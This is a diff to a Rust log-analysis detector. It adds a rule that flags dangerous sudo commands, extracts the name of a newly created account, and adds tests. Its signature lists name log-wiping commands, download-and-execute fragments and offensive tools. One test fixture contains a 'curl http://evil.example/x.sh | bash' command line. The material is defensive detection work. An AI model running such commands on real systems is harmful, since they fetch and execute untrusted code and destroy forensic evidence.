@@ -81,6 +81,7 @@ pub fn detect(events: &[LogEvent]) -> Vec<Finding> {
     out.extend(web_attacks(events));
     out.extend(path_scanning(events));
     out.extend(account_creation(events));
+    out.extend(suspicious_commands(events));
 
     // Worst severity first, then earliest.
     out.sort_by(|a, b| {
@@ -457,10 +458,174 @@ fn account_creation(events: &[LogEvent]) -> Vec<Finding> {
             severity: Severity::Medium,
             mitre: vec!["T1136".into()],
             summary: format!("Создание новой учётной записи: {}", e.summary),
-            actor: None,
+            actor: useradd_name(&e.raw),
             first_time: e.timestamp.clone(),
             last_time: e.timestamp.clone(),
             evidence: vec![EvidenceRef::of(e)],
+            hosts: Vec::new(),
+        });
+    }
+    findings
+}
+
+/// The account name from a `useradd`/`new user:` line (`name=<value>`), so the
+/// finding can point at who was created.
+fn useradd_name(raw: &str) -> Option<String> {
+    let rest = &raw[raw.find("name=")? + 5..];
+    let end = rest
+        .find(|c: char| c == ',' || c.is_whitespace())
+        .unwrap_or(rest.len());
+    let v = rest[..end].trim();
+    (!v.is_empty()).then(|| v.to_string())
+}
+
+// ---------------------------------------------------------------------------
+// Suspicious privileged commands (sudo COMMAND=…)
+// ---------------------------------------------------------------------------
+
+/// A class of dangerous command and the lowercase substrings that signal it in
+/// the command a `sudo` line recorded. Checked in order, so the first (most
+/// serious) matching class wins for a given command.
+struct CmdSig {
+    rule: &'static str,
+    title: &'static str,
+    severity: Severity,
+    mitre: &'static [&'static str],
+    needles: &'static [&'static str],
+}
+
+const CMD_SIGS: &[CmdSig] = &[
+    CmdSig {
+        rule: "cmd-log-clearing",
+        title: "Очистка журналов (антифорензика)",
+        severity: Severity::Critical,
+        mitre: &["T1070.002", "T1070"],
+        needles: &[
+            "rm -rf /var/log",
+            "rm -r /var/log",
+            "rm -f /var/log",
+            "rm /var/log",
+            "> /var/log",
+            "truncate",
+            "journalctl --vacuum",
+            "journalctl --rotate",
+            "shred",
+            "wtmp",
+            "btmp",
+            "lastlog",
+            "history -c",
+        ],
+    },
+    CmdSig {
+        rule: "cmd-download-exec",
+        title: "Загрузка и запуск постороннего кода",
+        severity: Severity::High,
+        mitre: &["T1059.004", "T1105"],
+        needles: &[
+            "|sh",
+            "| sh",
+            "|bash",
+            "| bash",
+            "sh -c",
+            "bash -c",
+            "base64 -d",
+            "/dev/tcp/",
+            "python -c",
+            "python3 -c",
+            "perl -e",
+            "curl http",
+            "wget http",
+        ],
+    },
+    CmdSig {
+        rule: "cmd-offensive-tool",
+        title: "Хакерский инструмент",
+        severity: Severity::Medium,
+        mitre: &["T1059"],
+        needles: &[
+            " nc ", "ncat", "netcat", "nmap", "masscan", "socat", "hydra", "hashcat", "chisel",
+        ],
+    },
+];
+
+/// Classify one recorded command into its most serious matching class.
+fn classify_command(cmd_lower: &str) -> Option<&'static CmdSig> {
+    CMD_SIGS
+        .iter()
+        .find(|sig| sig.needles.iter().any(|n| cmd_lower.contains(n)))
+}
+
+/// The user a `sudo` line attributes the command to (`sudo:   deploy : TTY…`),
+/// preferring a parsed field when present.
+fn sudo_user(e: &LogEvent) -> Option<String> {
+    if let Some(u) = e.fields.get("user").filter(|s| !s.is_empty()) {
+        return Some(u.clone());
+    }
+    let rest = e.raw.split("sudo:").nth(1)?;
+    let user = rest.split(" : ").next()?.trim();
+    (!user.is_empty() && !user.contains(' ')).then(|| user.to_string())
+}
+
+fn suspicious_commands(events: &[LogEvent]) -> Vec<Finding> {
+    // Group by (class, user) so repeated runs of one kind are one lead.
+    struct Group<'a> {
+        hits: Vec<&'a LogEvent>,
+    }
+    let mut groups: BTreeMap<(&'static str, String), Group> = BTreeMap::new();
+
+    for e in events {
+        if e.source != LogSource::Auth && e.source != LogSource::Syslog {
+            continue;
+        }
+        // Only sudo lines that actually ran a command.
+        let Some(cmd_start) = e.raw.find("COMMAND=") else {
+            continue;
+        };
+        if !e.raw.contains("sudo") {
+            continue;
+        }
+        let cmd = e.raw[cmd_start + "COMMAND=".len()..].to_ascii_lowercase();
+        let Some(sig) = classify_command(&cmd) else {
+            continue;
+        };
+        let user = sudo_user(e).unwrap_or_default();
+        groups
+            .entry((sig.rule, user))
+            .or_insert_with(|| Group { hits: Vec::new() })
+            .hits
+            .push(e);
+    }
+
+    let mut findings = Vec::new();
+    for ((rule, user), group) in groups {
+        let sig = CMD_SIGS.iter().find(|s| s.rule == rule).unwrap();
+        let n = group.hits.len();
+        let first = group.hits.first().unwrap();
+        let last = group.hits.last().unwrap();
+        let evidence: Vec<EvidenceRef> = group
+            .hits
+            .iter()
+            .take(MAX_EVIDENCE)
+            .map(|e| EvidenceRef::of(e))
+            .collect();
+        let who = if user.is_empty() {
+            String::new()
+        } else {
+            format!(" (пользователь {user})")
+        };
+        findings.push(Finding {
+            rule: rule.into(),
+            title: sig.title.into(),
+            severity: sig.severity,
+            mitre: sig.mitre.iter().map(|m| (*m).into()).collect(),
+            summary: format!(
+                "Через sudo выполнено {n} команд(ы) с признаком «{}»{who}.",
+                sig.title
+            ),
+            actor: (!user.is_empty()).then_some(user),
+            first_time: first.timestamp.clone(),
+            last_time: last.timestamp.clone(),
+            evidence,
             hosts: Vec::new(),
         });
     }
@@ -611,5 +776,61 @@ mod tests {
         let f = find(&t.findings, "account-created");
         assert!(f.mitre.iter().any(|m| m == "T1136"));
         assert!(f.evidence[0].raw.contains("backdoor"));
+        // The created account's name is surfaced as the actor.
+        assert_eq!(f.actor.as_deref(), Some("backdoor"));
+    }
+
+    #[test]
+    fn sudo_log_clearing_is_critical() {
+        let d = TempDir::new("logclear");
+        d.write(
+            "auth.log",
+            "Oct 10 15:00:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s\n",
+        );
+        let t = analyze_path(&d.0, &opts()).unwrap();
+        let f = find(&t.findings, "cmd-log-clearing");
+        assert_eq!(f.severity, Severity::Critical);
+        assert_eq!(f.actor.as_deref(), Some("deploy"));
+        assert!(f.mitre.iter().any(|m| m == "T1070.002"));
+    }
+
+    #[test]
+    fn sudo_download_and_execute_is_flagged() {
+        let d = TempDir::new("dlexec");
+        d.write(
+            "auth.log",
+            "Oct 10 15:01:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c curl http://evil.example/x.sh | bash\n",
+        );
+        let t = analyze_path(&d.0, &opts()).unwrap();
+        let f = find(&t.findings, "cmd-download-exec");
+        assert_eq!(f.severity, Severity::High);
+        assert!(f.mitre.iter().any(|m| m == "T1059.004"));
+    }
+
+    #[test]
+    fn sudo_offensive_tool_is_flagged() {
+        let d = TempDir::new("tool");
+        d.write(
+            "auth.log",
+            "Oct 10 15:02:00 web01 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install netcat\n",
+        );
+        let t = analyze_path(&d.0, &opts()).unwrap();
+        let f = find(&t.findings, "cmd-offensive-tool");
+        assert_eq!(f.severity, Severity::Medium);
+    }
+
+    #[test]
+    fn a_normal_sudo_command_raises_nothing() {
+        let d = TempDir::new("sudok");
+        d.write(
+            "auth.log",
+            "Oct 10 15:03:00 web01 sudo:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx\n",
+        );
+        let t = analyze_path(&d.0, &opts()).unwrap();
+        assert!(
+            t.findings.iter().all(|f| !f.rule.starts_with("cmd-")),
+            "{:#?}",
+            t.findings
+        );
     }
 }
